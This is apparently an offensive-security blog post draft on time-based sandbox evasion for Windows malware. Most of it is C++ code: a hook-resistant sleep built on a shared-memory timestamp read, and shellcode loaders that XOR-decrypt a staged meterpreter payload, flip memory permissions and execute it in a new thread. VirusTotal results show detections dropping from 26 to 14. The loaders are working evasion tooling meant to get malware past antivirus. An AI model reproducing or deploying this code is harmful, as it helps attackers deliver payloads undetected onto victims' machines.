---
title: "Sleepy malware is deadly malware"
date: 2022-11-20T14:28:34+01:00
draft: true
toc: false
images:
tags:
  - evasion antisandboxing 
---


## Sleep isn't for the weak
Time based evasion techniques **\[T1497\]** are a relatively painless and efficient way of avoiding sandboxes.

MEME HERE

Sandboxes are heavily relied on to detect malicious activity dynamically. Hence, it's a guarantee malware will do it's best at staying under the radar, achieving this by either blending in or timing out the sandbox.

One way of timing out the sandbox is simply making your malware sleep through it, exhausting the sandbox which makes it time out and assume the sample is benign.

However it's not *that* easy. Some modern detection solutions possess countermeasures against that, for example hooking sleep functions like `Sleep` in C/C++ or `Thread.Sleep` in C# to nullify the sleep, but also fast forwarding. TL;DR: Tampering to make the malware think it is in the clear.

A plethora of techniques can be applied to still "sleep", we will see some of them in this blogpost.

## Demonstration: Hooking sleep functions

## Weaponizing `__get_timestamp()`
Credits to Jordan Jay (Legacyy) for his amazing work on this.
I wont delve too deep on how this works as Legacyy himself [literally made a blogpost about it](https://www.legacyy.xyz/defenseevasion/windows/2022/07/04/abusing-shareduserdata-for-defense-evasion-and-exploitation.html) + the code is well commented.

```cpp
unsigned long long __get_timestamp()
{
	const size_t UNIX_TIME_START = 0x019DB1DED53E8000; // Start of Unix epoch in ticks.
	const size_t TICKS_PER_MILLISECOND = 1000; // A tick is 100ns.
	LARGE_INTEGER time;
	time.LowPart = *(DWORD *)( 0x7FFE0000 + 0x14 ); // Read LowPart as unsigned long.
	time.HighPart = *(long *)( 0x7FFE0000 + 0x1c ); // Read High1Part as long.
	return ( unsigned long long )( ( time.QuadPart - UNIX_TIME_START ) / TICKS_PER_MILLISECOND );
}
```

As a side note: I edited it to get the time in milliseconds.

##### Making a 

```cpp
void __alt_sleepms( size_t ms )
{
	volatile size_t x = rand(); // random buffer var 
	const unsigned long long end = __get_timestamp() + ms; // calculate when we shall stop sleeping
	while (__get_timestamp() < end) { x += 1; } // increment random var by 1 till we reach our endtime
}
```
And to be even more sneaky, we'll use a random time interval at each with sleep. 

Which we can ease by making a macro for that.

```cpp
#define INTERVAL rand() % 26 // Edit as you wish
#define MS_PER_SECOND 1000 
#define SLEEPTIME INTERVAL*MS_PER_SECOND // Make the use easier
```

Then we are simply able to 
```cpp
__alt_sleepms( SLEEPTIME );
```

## Loader
We will use a very basic loader for demo purposes.

I'll simply use a staged **HTTPS** meterpreter shellcode 

1. RWX memory, no shellcode encryption, no sleep in between instructions just simply loud and underdeveloped.
```cpp
#include <Windows.h>
#include "buf.h" // Header file containing our shellcode as "unsigned char buf[]"
int main()
{
	 //Allocate memory for our shellcode
     PVOID addr;
    addr = VirtualAlloc( NULL, sizeof( buf ), ( MEM_RESERVE | MEM_COMMIT ), PAGE_EXECUTE_READWRITE );

    memcpy( addr, buf, sizeof( buf ) );

    HANDLE hThread;
    DWORD id;
    hThread = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, &id );

    WaitForSingleObject( hThread, INFINITE );
 
    return 0;

}
```

3. Loader with alternative sleep + shellcode encryption
```cpp
#include <Windows.h>
#include "buf.h" // Header file containing our shellcode as "unsigned char buf[]"
#include "snorlax.h" // Header file containing our time based evasion stuff
#include "utils.h" // Header file containing RNG related stuff.



#define INTERVAL rand() % 26 // Edit as you wish
#define MS_PER_SECOND 1000 
#define SLEEPTIME INTERVAL*MS_PER_SECOND // Make the use easier




int main()
{
    // seed our generator 
    srand( defaultseed ); 
    
    // decrypt our xor encrypted shellcode
    xor_bytes( buf, SHELLCODE_SIZE, key, KEYLEN );

    // Allocate RW memory
    PVOID addr = VirtualAlloc( NULL, sizeof( buf ), ( MEM_RESERVE | MEM_COMMIT ), PAGE_READWRITE );

    // Copy our shellcode to the allocated memory
    memcpy( addr, buf, sizeof( buf ) );


    // Now the interesting part where we can leverage sleeping
    // We basically change memory perms like RW -> R -> RX 
    DWORD oldProtect;
    VirtualProtect( addr, sizeof( buf ), PAGE_READONLY, &oldProtect );
    
    //Sleep( SLEEPTIME );
    __alt_sleepms( SLEEPTIME );

    VirtualProtect( addr, sizeof( buf ), PAGE_EXECUTE_READ, &oldProtect );

    //Sleep( SLEEPTIME );
    __alt_sleepms( SLEEPTIME );

    DWORD id;
    HANDLE hThread = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, &id );

    WaitForSingleObject( hThread, INFINITE );

    return 0;

}

```

## Testing
Our testing of different versions of our loader will go as the following:
1. Loader with **0 evasion** and **0 shellcode encryption**
2. Loader with **0 evasion** but with **shellcode encryption**
3. Loader with both **time based evasion** (fast forward check, alternative sleep in between changes of memory permissions) and **shellcode encryption**

With nothing: https://www.virustotal.com/gui/file/98d4134cb824d533a92920f58a14d7c0fb7543520c950b27943263cbe1389244?nocache= (26/72)

Regular sleeps + changing memory perms: https://www.virustotal.com/gui/file/0d2d6284207fa529fcc05a1091cf3094203576d00d3d381302cb24c4f1f68336?nocache=1 (25/70)

Alt sleep + changing memory perms :https://www.virustotal.com/gui/file/c9c4edcc4e7d5ce5311642f12c2b3884194951c075f106e1bb1452d9dae48bd1?nocache=1 (14/70)


This is in the sole goal of knowing the efficiency of each version and therefore of this alternative sleeping method, by using a regular loader detection rate as a baseline for our test and then comparing the regular sleeping method with the alternative one.


Results are at the time of testing, the detection ratio might have changed in between the post and its creation.


# Credits/Sources
Jordan Jay ([@0xLegacyy](https://twitter.com/0xLegacyy)), [blog](https://www.legacyy.xyz) 